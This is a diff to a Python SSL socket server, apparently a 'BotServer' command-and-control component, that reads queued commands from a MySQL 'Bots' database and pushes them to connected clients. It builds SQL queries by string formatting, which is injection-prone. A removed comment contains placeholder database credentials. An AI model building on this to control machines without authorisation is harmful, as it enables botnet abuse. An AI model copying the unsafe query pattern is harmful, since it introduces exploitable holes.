@@ -15,11 +15,16 @@ openssl req -x509 -sha512 -days 365 -nodes -newkey rsa:2048 -keyout key.key -out
 GB, Scotland, Glasgow, Bots, [blank], BotServer, [blank]
 """
 
+#TODO: Have server send resource info - Ram, cpu, temp etc.
+#      upload to DB and have UI read it
+
 #TODO: Tidy and Clean code up
 
 #NOTE: There's currently little to none error handling
 #NOTE: If cursor not getting updated rows, transaction isolation level in mysql DB needs to be changed to "read commited"
 #      with statement: SET GLOBAL TRANSACTION ISOLATION LEVEL READ COMMITTED;
+
+#BUG: Server cant commit to DB - and is stuck loading - if web app is started first
 
 class Server:
     cert = "ssl_files/certificate.crt"
@@ -27,7 +32,7 @@ class Server:
     colours = {"INFO": "\033[1;37m", "ADD": "\033[1;32m", "REMOVE": "\033[1;31m", "TITLE": "\033[1;34m"}
 
     def __init__(self):
-        #addr = (input("IP: "), int(input("Port: ")))
+        addr = (input("IP: "), int(input("Port: ")))
         addr = ("127.0.0.1", 999)
         self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -59,12 +64,8 @@ class Server:
 
         try:
             while True:
-                #NOTE: Naive attempt at getting Server to have updated values from table,
-                #      the server should NOT have to constantly disconnect and reconnect
-                #db = pymysql.connect("localhost", "root", "pass", "Bots")
                 cursor = db.cursor()
                 rs = cursor.execute("select ClientCommand.CommandID, ClientID, Command from ClientCommand inner join Command on ClientCommand.CommandID = Command.CommandID where Sent is null")
-                #rs = cursor.execute("select ClientCommand.CommandID, ClientID, Command from ClientCommand inner join Command on ClientCommand.CommandID = Command.CommandID")
                 results = cursor.fetchall()
                 if results:
                     for cmd in results:
@@ -72,10 +73,10 @@ class Server:
                         try:
                             self.clients[cmd[1]][0].send(str(["COMMAND", cmd]).encode("utf-8"))
                         except KeyError:
+                            cursor.execute("delete from ClientCommand where ClientID = '{}'".format(cmd[1]))
                             continue
                         cursor.execute("update ClientCommand set Sent = 1 where ClientID = '{}' and CommandID = '{}'".format(cmd[1], cmd[0]))
                         db.commit()
-                #db.close()
 
         except (KeyboardInterrupt, ValueError):
             pass
